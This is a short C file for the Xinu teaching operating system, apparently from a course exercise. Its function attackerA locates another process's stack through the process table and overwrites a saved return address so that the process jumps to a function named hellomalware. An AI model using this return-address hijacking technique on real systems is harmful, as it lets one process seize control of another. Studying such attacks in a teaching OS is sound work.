#include <xinu.h>

extern void hellomalware(void);

void attackerA(int y){
	unsigned long * victimSP = (unsigned long *)proctab[getpid()-y].prstkptr;	// Get the pointer to the stack
	unsigned long * victimBP = victimSP + 2;					// Get base pointer
	unsigned long * victimSleepBP = (unsigned long *) *victimBP;			// Get the base pointer for the sleep
	unsigned long * attackAddress = victimSleepBP + 1;				// Get the pointer to the address to modify
	*attackAddress = (unsigned long)&hellomalware;					// Set address to our malware function
}
